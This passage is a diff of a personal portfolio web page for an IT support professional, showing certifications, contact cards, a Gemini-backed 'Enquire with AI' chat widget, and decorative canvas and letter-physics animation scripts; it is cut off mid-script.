+                                    <div class="w-14 h-14 rounded-2xl bg-blue-500/20 flex items-center justify-center flex-shrink-0 text-blue-400 font-black font-display text-xl">MS</div>
+                                    <div>
+                                        <p class="font-bold text-primary text-lg">Azure Fundamentals (AZ-900)</p>
+                                        <p class="text-xs text-gray-400 font-mono-custom mt-1 tracking-widest uppercase">Microsoft</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="flex items-center justify-between p-6 rounded-2xl border border-white/10 bg-transparent hover:bg-white/5 transition-colors">
+                                <div class="flex items-center gap-5">
+                                    <div class="w-14 h-14 rounded-2xl bg-red-500/20 flex items-center justify-center flex-shrink-0 text-red-400 font-black font-display text-xl">G</div>
+                                    <div>
+                                        <p class="font-bold text-primary text-lg">Technical Support Fundamentals</p>
+                                        <p class="text-xs text-gray-400 font-mono-custom mt-1 tracking-widest uppercase">Google</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="flex items-center justify-between p-6 rounded-2xl border border-white/10 bg-transparent hover:bg-white/5 transition-colors">
+                                <div class="flex items-center gap-5">
+                                    <div class="w-14 h-14 rounded-2xl bg-red-500/20 flex items-center justify-center flex-shrink-0 text-red-400 font-black font-display text-xl">G</div>
+                                    <div>
+                                        <p class="font-bold text-primary text-lg leading-tight">The Bits and Bytes of Computer Networking</p>
+                                        <p class="text-xs text-gray-400 font-mono-custom mt-1 tracking-widest uppercase">Google</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="flex items-center justify-between p-6 rounded-2xl border border-white/10 bg-transparent hover:bg-white/5 transition-colors">
+                                <div class="flex items-center gap-5">
+                                    <div class="w-14 h-14 rounded-2xl bg-purple-500/20 flex items-center justify-center flex-shrink-0 text-purple-400 font-black font-display text-xl">A</div>
+                                    <div>
+                                        <p class="font-bold text-primary text-lg leading-tight">Testing for Web Accessibility With Accessibility Insights</p>
+                                        <p class="text-xs text-gray-400 font-mono-custom mt-1 tracking-widest uppercase">Accessibility</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="flex items-center justify-between p-6 rounded-2xl border border-white/10 bg-transparent hover:bg-white/5 transition-colors md:col-span-2">
+                                <div class="flex items-center gap-5">
+                                    <div class="w-14 h-14 rounded-2xl bg-red-500/20 flex items-center justify-center flex-shrink-0 text-red-400 font-black font-display text-xl">G</div>
+                                    <div>
+                                        <p class="font-bold text-primary text-lg">Google IT Professional Certification</p>
+                                        <p class="text-xs text-gray-400 font-mono-custom mt-1 tracking-widest uppercase">Google</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ==========================================================================
+             CONTACT SECTION (CRED STYLE PREMIUM CARDS W/ CUSTOM ICONS)
+             ========================================================================== -->
+        <section id="contact" class="py-32 px-6 max-w-[1400px] mx-auto border-t border-white/10">
+            
+            <div class="text-center max-w-2xl mx-auto mb-24 reveal">
+                <div class="section-tag mx-auto hover-trigger">Initiate Handshake</div>
+                <h2 class="font-display text-5xl md:text-[4.5rem] font-black tracking-tighter text-primary leading-tight mt-4 mb-6">
+                    Let's Connect.
+                </h2>
+                <p class="text-xl text-gray-400 font-light">
+                    Available for technical support, systems administration, and high-level operations consulting.
+                </p>
+            </div>
+            
+            <!-- Exact Contact Requirements (3 Clickable Options with Custom Premium SVGs) -->
+            <div class="grid sm:grid-cols-1 md:grid-cols-3 gap-8 w-full max-w-6xl mx-auto reveal reveal-delay-2">
+                
+                <!-- LinkedIn Premium Card -->
+                <div class="comet-cards-wrapper hover-trigger">
+                    <a href="https://www.linkedin.com/in/osaid-shahid-442599223/" target="_blank" rel="noopener noreferrer" class="comet-card social-card linkedin p-10 block border-white/10">
+                        <div class="social-icon-wrapper mx-auto bg-white/5 border-white/10">
+                            <!-- Official LinkedIn SVG Path -->
+                            <svg class="social-icon-svg w-10 h-10" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                            </svg>
+                        </div>
+                        <h3 class="font-display text-3xl font-black mb-3">LinkedIn</h3>
+                        <p class="text-gray-400 text-base font-light mb-8 text-center">Professional Network</p>
+                        <span class="text-xs font-mono-custom text-blue-400 font-bold uppercase tracking-widest bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20">Connect &rarr;</span>
+                    </a>
+                </div>
+
+                <!-- Email Premium Card with Custom Gmail SVG -->
+                <div class="comet-cards-wrapper hover-trigger">
+                    <a href="mailto:osaidtheshahid@gmail.com" class="comet-card social-card gmail p-10 block border-white/10">
+                        <div class="social-icon-wrapper mx-auto bg-white/5 border-white/10">
+                            <!-- Custom Premium Gmail Logo Vector -->
+                            <svg class="w-12 h-12 transition-all duration-300" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M22 6C22 4.9 21.1 4 20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6Z" fill="#333" class="gmail-bg transition-colors duration-300" />
+                                <path d="M22 6L12 13L2 6" stroke="#ea4335" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="gmail-red transition-colors duration-300"/>
+                                <path d="M2 18V6L12 13L22 6V18" stroke="#4285f4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="gmail-blue transition-colors duration-300"/>
+                            </svg>
+                        </div>
+                        <h3 class="font-display text-3xl font-black mb-3">Email</h3>
+                        <p class="text-gray-400 text-sm font-light mb-8 text-center break-all px-4">osaidtheshahid@gmail.com</p>
+                        <span class="text-xs font-mono-custom text-red-400 font-bold uppercase tracking-widest bg-red-500/10 px-4 py-2 rounded-full border border-red-500/20">Send Message &rarr;</span>
+                    </a>
+                </div>
+
+                <!-- Phone Premium Card with Custom Premium Phone SVG -->
+                <div class="comet-cards-wrapper hover-trigger">
+                    <a href="tel:+918448527162" class="comet-card social-card phone p-10 block border-white/10">
+                        <div class="social-icon-wrapper mx-auto bg-white/5 border-white/10">
+                            <!-- Custom Premium Phone Receiver Vector -->
+                            <svg class="w-12 h-12 transition-all duration-300" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M21.05 16.94L18.43 14.32C17.9 13.79 17.06 13.71 16.48 14.13L14.71 15.42C14.28 15.73 13.7 15.75 13.2 15.5C11.58 14.68 9.32 12.42 8.5 10.8C8.25 10.3 8.27 9.72 8.58 9.29L9.87 7.52C10.29 6.94 10.21 6.1 9.68 5.57L7.06 2.95C6.48 2.37 5.55 2.43 5.06 3.06L4.03 4.38C2.96 5.75 2.59 7.58 3.01 9.28C4.15 13.88 8.04 18.25 12.83 19.98C14.6 20.61 16.51 20.31 17.93 19.26L19.29 18.26C19.92 17.78 19.97 16.85 19.39 16.27C20.34 17.22 21.05 16.94 21.05 16.94Z" fill="#333" class="phone-bg transition-colors duration-300"/>
+                                <path d="M21.05 16.94L18.43 14.32C17.9 13.79 17.06 13.71 16.48 14.13L14.71 15.42C14.28 15.73 13.7 15.75 13.2 15.5C11.58 14.68 9.32 12.42 8.5 10.8C8.25 10.3 8.27 9.72 8.58 9.29L9.87 7.52C10.29 6.94 10.21 6.1 9.68 5.57L7.06 2.95C6.48 2.37 5.55 2.43 5.06 3.06L4.03 4.38C2.96 5.75 2.59 7.58 3.01 9.28C4.15 13.88 8.04 18.25 12.83 19.98C14.6 20.61 16.51 20.31 17.93 19.26L19.29 18.26C19.92 17.78 19.97 16.85 19.39 16.27" stroke="#34a853" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="phone-outline transition-colors duration-300"/>
+                            </svg>
+                        </div>
+                        <h3 class="font-display text-3xl font-black mb-3">Direct Line</h3>
+                        <p class="text-gray-400 text-base font-light mb-8 text-center">+91 8448527162</p>
+                        <span class="text-xs font-mono-custom text-emerald-400 font-bold uppercase tracking-widest bg-emerald-500/10 px-4 py-2 rounded-full border border-emerald-500/20">Call Now &rarr;</span>
+                    </a>
+                </div>
+
+            </div>
+        </section>
+
+    </main>
+
+    <!-- ==========================================================================
+         END OF UNIVERSE MESSAGE
+         ========================================================================== -->
+    <div class="w-full flex flex-col items-center justify-center pt-12 pb-24 relative z-10 reveal">
+        <div class="w-[1px] h-24 bg-gradient-to-b from-transparent via-white/30 to-transparent mb-8"></div>
+        <p class="font-mono-custom text-[10px] md:text-xs text-gray-500 tracking-[0.4em] uppercase text-center px-4 transition-all duration-700 hover:tracking-[0.5em] hover:text-gray-300">
+            You have reached the end of the <br class="sm:hidden"> 
+            <span class="text-white font-bold drop-shadow-[0_0_12px_rgba(255,255,255,0.6)]">Observable Universe.</span>
+        </p>
+    </div>
+
+    <!-- ==========================================================================
+         FOOTER
+         ========================================================================== -->
+    <footer class="border-t border-white/10 py-16 text-center flex flex-col items-center bg-black relative z-10">
+        <p class="text-xs text-gray-500 font-mono-custom tracking-[0.2em] uppercase mb-4">
+            Based in Maunath Bhanjan, Mau, India 275101
+        </p>
+        <p class="text-[10px] text-gray-600 font-mono-custom tracking-widest uppercase font-bold">
+            Premium Architecture · Designed & Built by Osaid Shahid · © 2026
+        </p>
+    </footer>
+
+    <!-- ==========================================================================
+         AI CHAT WIDGET (ENQUIRE WITH AI)
+         ========================================================================== -->
+    <button id="ai-chat-toggle" class="hover-trigger">
+        <svg class="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+        <span class="text-black">Enquire with AI ✨</span>
+    </button>
+
+    <div id="ai-chat-window">
+        <div class="chat-header">
+            <div>
+                <h3 class="font-display font-bold text-primary text-xl">Enquire with AI ✨</h3>
+                <p class="text-xs text-gray-400 font-mono-custom mt-1">Powered by Gemini Engine</p>
+            </div>
+            <button id="ai-chat-close" class="text-gray-400 hover:text-white transition hover-trigger bg-white/10 p-2 rounded-full">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </button>
+        </div>
+        <div class="chat-messages" id="chat-messages">
+            <div class="chat-message message-ai">
+                Hello! I am Osaid's AI clone. You can ask me anything about his exact resume experience, his AZ-900 certification, or his work as an App/Cloud Technical Support expert. How can I help you?
+            </div>
+        </div>
+        <div class="chat-input-area">
+            <input type="text" id="chat-input" class="chat-input hover-trigger" placeholder="Ask about his skills..." autocomplete="off">
+            <button id="chat-send" class="chat-send-btn hover-trigger">
+                <svg class="w-5 h-5 ml-1 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path></svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- ==========================================================================
+         JAVASCRIPT LOGIC (Physics Canvas Engine, Custom Cursor, Reveals, Nav, Chat, Comet Spotlight)
+         ========================================================================== -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // Central visibility state for throttling expensive loops
+            let isHeroVisible = true;
+            const heroSection = document.getElementById('about');
+            if (heroSection) {
+                const observer = new IntersectionObserver((entries) => {
+                    isHeroVisible = entries[0].isIntersecting;
+                }, { rootMargin: "200px" });
+                observer.observe(heroSection);
+            }
+
+            /* ==========================================================================
+               1. BESPOKE WEBGL-STYLE PHYSICS ENGINE (CANVAS 2D)
+               ========================================================================== */
+            const canvas = document.getElementById('physics-canvas');
+            if (canvas) {
+                const ctx = canvas.getContext('2d', { alpha: true });
+                
+                let width, height;
+                let particles = [];
+                
+                const resizeCanvas = () => {
+                    width = window.innerWidth;
+                    height = window.innerHeight;
+                    canvas.width = width * window.devicePixelRatio;
+                    canvas.height = height * window.devicePixelRatio;
+                    ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
+                };
+                
+                window.addEventListener('resize', resizeCanvas);
+                resizeCanvas();
+
+                class NodeParticle {
+                    constructor() {
+                        this.x = Math.random() * width;
+                        this.y = Math.random() * height;
+                        this.vx = (Math.random() - 0.5) * 0.2; 
+                        this.vy = (Math.random() - 0.5) * 0.2;
+                        this.baseRadius = Math.random() * 1.5 + 0.5;
+                        this.radius = this.baseRadius;
+                        this.pulsePhase = Math.random() * Math.PI * 2;
+                    }
+                    update() {
+                        if (this.x < -50) this.x = width + 50;
+                        if (this.x > width + 50) this.x = -50;
+                        if (this.y < -50) this.y = height + 50;
+                        if (this.y > height + 50) this.y = -50;
+                        this.x += this.vx;
+                        this.y += this.vy;
+                        this.pulsePhase += 0.015;
+                        this.radius = this.baseRadius + Math.sin(this.pulsePhase) * 0.4;
+                    }
+                    draw() {
+                        ctx.beginPath();
+                        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                        ctx.fillStyle = `rgba(255, 255, 255, ${0.05 + (this.radius * 0.02)})`;
+                        ctx.fill();
+                    }
+                }
+
+                const initParticles = () => {
+                    particles = [];
+                    // Severely reduce particle density on mobile to hit 60fps
+                    const density = window.innerWidth < 768 ? 40000 : 15000;
+                    const maxParticles = window.innerWidth < 768 ? 25 : 100;
+                    const numParticles = Math.min(Math.floor((width * height) / density), maxParticles); 
+                    for (let i = 0; i < numParticles; i++) {
+                        particles.push(new NodeParticle());
+                    }
+                };
+                
+                initParticles();
+
+                const animateCanvas = () => {
+                    if (!isHeroVisible) {
+                        requestAnimationFrame(animateCanvas);
+                        return; // Throttle when out of view!
+                    }
+
+                    ctx.clearRect(0, 0, width, height);
+                    for (let i = 0; i < particles.length; i++) {
+                        for (let j = i + 1; j < particles.length; j++) {
+                            const dx = particles[i].x - particles[j].x;
+                            const dy = particles[i].y - particles[j].y;
+                            const distSq = dx * dx + dy * dy;
+                            if (distSq < 16900) {
+                                const dist = Math.sqrt(distSq);
+                                ctx.beginPath();
+                                ctx.moveTo(particles[i].x, particles[i].y);
+                                ctx.lineTo(particles[j].x, particles[j].y);
+                                ctx.strokeStyle = `rgba(255, 255, 255, ${0.03 * (1 - dist / 130)})`;
+                                ctx.lineWidth = 0.5;
+                                ctx.stroke();
+                            }
+                        }
+                    }
+                    particles.forEach(p => { p.update(); p.draw(); });
+                    requestAnimationFrame(animateCanvas);
+                };
+                animateCanvas();
+            }
+
+            const generateStars = (n) => {
+                let value = `${Math.floor(Math.random() * 3000)}px ${Math.floor(Math.random() * 4000)}px #FFF`;
+                for(let i=1; i<n; i++){ 
+                    value += `, ${Math.floor(Math.random() * 3000)}px ${Math.floor(Math.random() * 4000)}px #FFF`; 
+                }
+                return value;
+            };
+
+            const star1 = document.getElementById('stars-1');
+            const star2 = document.getElementById('stars-2');
+            const star3 = document.getElementById('stars-3');
+            const mainSaturn = document.getElementById('main-saturn');
+
+            // Set stars with solid math floors to avoid render corruption
+            if (star1) star1.style.boxShadow = generateStars(1000);
+            if (star2) star2.style.boxShadow = generateStars(500);
+            if (star3) star3.style.boxShadow = generateStars(200);
+
+            let parallaxTicking = false;
+            window.addEventListener('scroll', () => {
+                if (!parallaxTicking) {
+                    window.requestAnimationFrame(() => {
+                        const scrollY = window.scrollY;
+                        document.querySelectorAll('.planet-orbit').forEach(orbit => {
+                            const speed = parseFloat(orbit.dataset.speed);
+                            const rotSpeed = parseFloat(orbit.dataset.rot);
+                            orbit.style.transform = `translate3d(-50%, -50%, 0) translateY(${scrollY * speed}px) rotate(${scrollY * rotSpeed}deg)`;
+                        });
+                        
+                        if (star1) star1.style.transform = `translate3d(0, ${scrollY * -0.05}px, 0)`;
+                        if (star2) star2.style.transform = `translate3d(0, ${scrollY * -0.1}px, 0)`;
+                        if (star3) star3.style.transform = `translate3d(0, ${scrollY * -0.15}px, 0)`;
+                        if (mainSaturn) mainSaturn.style.transform = `translate3d(-50%, -50%, 0) rotate(${scrollY * 0.03}deg)`;
+                        
+                        parallaxTicking = false;
+                    });
+                    parallaxTicking = true;
+                }
+            }, { passive: true });
+
+            /* ==========================================================================
+               2. CUSTOM PHYSICS CURSOR LOGIC
+               ========================================================================== */
+            const cursorDot = document.getElementById('cursor-dot');
+            const cursorOutline = document.getElementById('cursor-outline');
+            const hoverTriggers = document.querySelectorAll('.hover-trigger, a, button, input');
+            let mouseX = window.innerWidth / 2, mouseY = window.innerHeight / 2;
+            let outlineX = window.innerWidth / 2, outlineY = window.innerHeight / 2;
+            let hasMouse = false;
+
+            window.addEventListener('mousemove', (e) => {
+                hasMouse = true;
+                mouseX = e.clientX; mouseY = e.clientY;
+                if(cursorDot) { cursorDot.style.transform = `translate3d(calc(${mouseX}px - 50%), calc(${mouseY}px - 50%), 0)`; }
+            });
+
+            const animateCursor = () => {
+                if (hasMouse) {
+                    let distX = mouseX - outlineX; let distY = mouseY - outlineY;
+                    outlineX += distX * 0.35; outlineY += distY * 0.35;
+                    if(cursorOutline) { cursorOutline.style.transform = `translate3d(calc(${outlineX}px - 50%), calc(${outlineY}px - 50%), 0)`; }
+                }
+                requestAnimationFrame(animateCursor);
+            };
+            animateCursor();
+
+            hoverTriggers.forEach(trigger => {
+                trigger.addEventListener('mouseenter', () => document.body.classList.add('hovering'));
+                trigger.addEventListener('mouseleave', () => document.body.classList.remove('hovering'));
+            });
+            window.addEventListener('mousedown', () => document.body.classList.add('clicking'));
+            window.addEventListener('mouseup', () => document.body.classList.remove('clicking'));
+
+            /* ==========================================================================
+               4. PERPLEXITY COMET SPOTLIGHT BORDER EFFECT
+               ========================================================================== */
+            const cometWrappers = document.querySelectorAll('.comet-cards-wrapper');
+            cometWrappers.forEach(wrapper => {
+                wrapper.addEventListener('mousemove', (e) => {
+                    const rect = wrapper.getBoundingClientRect();
+                    const x = e.clientX - rect.left; const y = e.clientY - rect.top;
+                    wrapper.style.setProperty('--mouse-x', `${x}px`);
+                    wrapper.style.setProperty('--mouse-y', `${y}px`);
+                });
+            });
+
+            /* ==========================================================================
+               5. SMOOTH SCROLL REVEAL OBSERVERS
+               ========================================================================== */
+            const revealElements = document.querySelectorAll('.reveal');
+            const revealOptions = { threshold: 0.05, rootMargin: "0px 0px -40px 0px" };
+            const revealOnScroll = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (!entry.isIntersecting) return;
+                    entry.target.classList.add('active'); observer.unobserve(entry.target); 
+                });
+            }, revealOptions);
+            revealElements.forEach(el => revealOnScroll.observe(el));
+
+            /* ==========================================================================
+               6. MOBILE MENU & NAVBAR LOGIC
+               ========================================================================== */
+            const mobileBtn = document.getElementById('mobile-menu-btn');
+            const mobileMenu = document.getElementById('mobile-menu');
+            const mobileLinks = document.querySelectorAll('.mobile-link');
+            const bar1 = document.getElementById('bar1'); const bar2 = document.getElementById('bar2'); const bar3 = document.getElementById('bar3');
+            let isMenuOpen = false;
+
+            const toggleMenu = () => {
+                isMenuOpen = !isMenuOpen;
+                if(isMenuOpen) {
+                    mobileMenu.classList.remove('opacity-0', 'pointer-events-none'); mobileMenu.classList.add('opacity-100', 'pointer-events-auto');
+                    document.body.style.overflow = 'hidden';
+                    bar1.style.transform = 'translateY(8px) rotate(45deg)'; bar2.style.opacity = '0'; bar3.style.transform = 'translateY(-8px) rotate(-45deg)';
+                } else {
+                    mobileMenu.classList.add('opacity-0', 'pointer-events-none'); mobileMenu.classList.remove('opacity-100', 'pointer-events-auto');
+                    document.body.style.overflow = '';
+                    bar1.style.transform = 'none'; bar2.style.opacity = '1'; bar3.style.transform = 'none';
+                }
+            };
+            mobileBtn.addEventListener('click', toggleMenu);
+            mobileLinks.forEach(link => link.addEventListener('click', toggleMenu));
+
+            const navbar = document.getElementById('navbar');
+            let navTicking = false;
+            window.addEventListener('scroll', () => {
+                if (!navTicking) {
+                    window.requestAnimationFrame(() => {
+                        if(window.scrollY > 50) {
+                            navbar.style.paddingTop = '1.25rem'; navbar.style.paddingBottom = '1.25rem';
+                            navbar.style.backgroundColor = 'rgba(10, 10, 15, 0.8)'; navbar.style.boxShadow = '0 10px 40px -10px rgba(0,0,0,0.5)';
+                        } else {
+                            navbar.style.paddingTop = '1.5rem'; navbar.style.paddingBottom = '1.5rem';
+                            navbar.style.backgroundColor = 'rgba(10, 10, 15, 0.4)'; navbar.style.boxShadow = 'none';
+                        }
+                        navTicking = false;
+                    });
+                    navTicking = true;
+                }
+            }, { passive: true });
+            window.dispatchEvent(new Event('scroll'));
+
+            /* ==========================================================================
+               7. GEMINI AI LOGIC (ENQUIRE WITH AI)
+               ========================================================================== */
+            const chatToggle = document.getElementById('ai-chat-toggle');
+            const chatClose = document.getElementById('ai-chat-close');
+            const chatWindow = document.getElementById('ai-chat-window');
+            const chatInput = document.getElementById('chat-input');
+            const chatSendBtn = document.getElementById('chat-send');
+            const chatMessagesContainer = document.getElementById('chat-messages');
+
+            chatToggle.addEventListener('click', () => { chatWindow.classList.add('active'); chatInput.focus(); });
+            chatClose.addEventListener('click', () => chatWindow.classList.remove('active'));
+
+            const apiKey = "";
+            const systemPrompt = `You are the personal AI assistant for Osaid Shahid, an App/Cloud Technical Support Expert. 
+Your goal is to answer questions about his professional background accurately and professionally.
+Keep responses concise (1-3 sentences). Be polite and premium in tone.`;
+
+            async function fetchWithRetry(url, options, retries = 5) {
+                const delays = [1000, 2000, 4000, 8000, 16000];
+                for (let i = 0; i < retries; i++) {
+                    try {
+                        const response = await fetch(url, options);
+                        if (!response.ok) throw new Error('API request failed');
+                        return await response.json();
+                    } catch (err) {
+                        if (i === retries - 1) throw err;
+                        await new Promise(res => setTimeout(res, delays[i]));
+                    }
+                }
+            }
+
+            async function handleUserMessage() {
+                const userText = chatInput.value.trim();
+                if (!userText) return;
+                addMessage(userText, 'user'); chatInput.value = '';
+                const typingId = 'typing-' + Date.now();
+                addMessage(`<div class="typing-dots"><span></span><span></span><span></span></div>`, 'ai', typingId);
+
+                const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
+                const payload = { contents: [{ parts: [{ text: userText }] }], systemInstruction: { parts: [{ text: systemPrompt }] } };
+
+                try {
+                    const result = await fetchWithRetry(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                    const aiText = result.candidates?.[0]?.content?.parts?.[0]?.text || "I'm having trouble connecting to my database right now. Please try again later.";
+                    const typingEl = document.getElementById(typingId);
+                    if (typingEl) { typingEl.innerHTML = aiText; typingEl.removeAttribute('id'); } else { addMessage(aiText, 'ai'); }
+                } catch (error) {
+                    const typingEl = document.getElementById(typingId);
+                    if (typingEl) { typingEl.innerHTML = "Apologies, the secure connection to Osaid's database timed out. Please email him directly!"; typingEl.removeAttribute('id'); }
+                }
+            }
+
+            function addMessage(text, sender, id = null) {
+                const msgDiv = document.createElement('div');
+                msgDiv.className = `chat-message message-${sender}`;
+                if (id) msgDiv.id = id;
+                msgDiv.innerHTML = text;
+                chatMessagesContainer.appendChild(msgDiv);
+                chatMessagesContainer.scrollTo({ top: chatMessagesContainer.scrollHeight, behavior: 'smooth' });
+            }
+
+            chatSendBtn.addEventListener('click', handleUserMessage);
+            chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleUserMessage(); });
+
+            /* ==========================================================================
+               8. GEMINI LEVEL: INFINITE FALLING LETTERS & REPAIR BOT PHYSICS
+               ========================================================================== */
+            
+            const textBlock = document.getElementById('physics-text-block');
+            const sceneContainer = document.getElementById('fixer-scene-container');
+            const botEl = document.getElementById('fixer-bot');
+            const tractorBeam = document.getElementById('tractor-beam');
+            const sparkContainer = document.getElementById('weld-sparks');
+
+            const line1Text = "Delivering";
+            const line2Text = "Outstanding Service.";
+            
+            const lettersData = [];
+            let letterIdCounter = 0;
+
+            function createLine(text, classString, isGradient) {
+                const lineDiv = document.createElement('div');
+                lineDiv.className = 'block w-full ' + classString;
+                
+                const words = text.split(' ');
+                words.forEach((word, wIdx) => {
+                    const wordSpan = document.createElement('span');
+                    wordSpan.className = 'inline-block whitespace-nowrap';
+                    
+                    for (let i = 0; i < word.length; i++) {
+                        const char = word[i];
+                        
+                        const wrapper = document.createElement('span');
+                        wrapper.className = 'char-wrapper';
+                        
+                        const inner = document.createElement('span');
+                        inner.className = isGradient 
+                            ? 'char-inner text-gray-300 drop-shadow-[0_0_12px_rgba(255,255,255,0.2)]'
+                            : 'char-inner text-white drop-shadow-[0_0_10px_rgba(255,255,255,0.4)]';
+                        inner.innerText = char;
+                        
+                        wrapper.appendChild(inner);
+                        wordSpan.appendChild(wrapper);
+                        
+                        lettersData.push({
+                            id: letterIdCounter++,
+                            wrapper: wrapper,
+                            el: inner,
+                            state: 'normal', 
+                            x: 0, y: 0,
+                            vx: 0, vy: 0,
+                            rot: 0, vRot: 0,
+                            origSceneX: 0, origSceneY: 0 
+                        });
+                    }
+                    lineDiv.appendChild(wordSpan);
+                    
+                    if (wIdx < words.length - 1) {
+                        const spaceSpan = document.createElement('span');
+                        spaceSpan.className = 'inline-block';
+                        spaceSpan.innerHTML = '&nbsp;';
+                        lineDiv.appendChild(spaceSpan);
+                    }
+                });
+                return lineDiv;
+            }
+
+            textBlock.appendChild(createLine(line1Text, '', false));
+            textBlock.appendChild(createLine(line2Text, 'text-3xl sm:text-5xl md:text-[3.5rem] lg:text-[4.5rem] font-medium tracking-tight mt-1 sm:mt-2', true));
+
+            const GRAVITY = 0.4;
+            const BOUNCE = -0.4;
+            const FRICTION = 0.8;
+            const WALL_BOUNCE = -0.7; 
+            
+            const bot = {
+                x: 100, y: -100,
+                targetX: 100, targetY: -100,
+                state: 'patrol', 
+                targetLetter: null,
+                weldTimer: 0,
+                patrolAngle: 0
+            };
+
+            function updateOrigins() {
+                const sceneRect = sceneContainer.getBoundingClientRect();
+                lettersData.forEach(l => {
+                    const rect = l.wrapper.getBoundingClientRect();
+                    l.origSceneX = rect.left - sceneRect.left;
+                    l.origSceneY = rect.top - sceneRect.top;
+                });
+            }
+            
+            setTimeout(updateOrigins, 500); 
+            window.addEventListener('resize', updateOrigins);
+
+            function emitWeldSparks(x, y) {
+                const numSparks = window.innerWidth < 768 ? 1 : 3;
+                for(let i=0; i<numSparks; i++) {
+                    const spark = document.createElement('div');
+                    spark.className = 'absolute rounded-full pointer-events-none bg-accent-cyan';
+                    const size = Math.random() * 3 + 2;
+                    spark.style.width = size + 'px'; spark.style.height = size + 'px';
+                    spark.style.left = x + 'px'; spark.style.top = y + 'px';
+                    spark.style.boxShadow = `0 0 ${size*2}px #00e1ff`;
+                    sparkContainer.appendChild(spark);
+
+                    let vx = (Math.random() - 0.5) * 8;
+                    let vy = (Math.random() - 0.5) * 8 - 2;
+                    let op = 1;
+
+                    function anim() {
+                        if (op <= 0) { spark.remove(); return; }
+                        vy += GRAVITY;
+                        const cl = parseFloat(spark.style.left); const ct = parseFloat(spark.style.top);
+                        spark.style.left = (cl + vx) + 'px'; spark.style.top = (ct + vy) + 'px';
+                        op -= 0.05; spark.style.opacity = op;
+                        requestAnimationFrame(anim);
+                    }
+                    requestAnimationFrame(anim);
+                }
+            }
+
+            let lastDropTime = 0;
+            function gameLoop(timestamp) {
+                if (!isHeroVisible) {
+                    requestAnimationFrame(gameLoop);
+                    return; // Throttle completely when out of view
+                }
+
+                const floorY = sceneContainer.offsetHeight - 40; 
+                const rightWall = sceneContainer.offsetWidth - 40; 
+                const leftWall = 20; 
+
+                const activeLetters = lettersData.filter(l => l.state !== 'normal');
+
+                if (activeLetters.length === 0 && timestamp - lastDropTime > (Math.random() * 2000 + 1000)) {
+                    const attached = lettersData.filter(l => l.state === 'normal');
+                    if (attached.length > 0) {
+                        const dropMe = attached[Math.floor(Math.random() * attached.length)];
+                        dropMe.state = 'falling';
+                        dropMe.el.classList.add('falling');
+                        dropMe.vx = (Math.random() - 0.5) * 4;
+                        dropMe.vy = -Math.random() * 4 - 2; 
+                        dropMe.vRot = (Math.random() - 0.5) * 15;
+                        lastDropTime = timestamp;
+                    }
+                }
+
+                lettersData.forEach(l => {
+                    if (l.state === 'falling') {
+                        l.vy += GRAVITY; l.x += l.vx; l.y += l.vy; l.rot += l.vRot;
+                        const absoluteY = l.origSceneY + l.y;
+                        if (absoluteY > floorY) {
+                            l.y = floorY - l.origSceneY; 
+                            l.vy *= BOUNCE; l.vx *= FRICTION; l.vRot *= 0.8;
+                            if (Math.abs(l.vy) < 1.5 && Math.abs(l.vx) < 0.5) { l.state = 'floor'; l.vy = 0; l.vx = 0; l.vRot = 0; }
+                        }
+                        const absoluteX = l.origSceneX + l.x;
+                        if (absoluteX < leftWall) { l.x = leftWall - l.origSceneX; l.vx *= WALL_BOUNCE; l.vRot *= 0.8; } 
+                        else if (absoluteX > rightWall) { l.x = rightWall - l.origSceneX; l.vx *= WALL_BOUNCE; l.vRot *= 0.8; }
+                        l.el.style.transform = `translate3d(${l.x}px, ${l.y}px, 0) rotate(${l.rot}deg)`;
+                    } 
+                    else if (l.state === 'carried') {
+                        const carryAbsX = bot.x + 20; 
+                        const carryAbsY = bot.y + 40; 
+                        l.x = carryAbsX - l.origSceneX; l.y = carryAbsY - l.origSceneY;
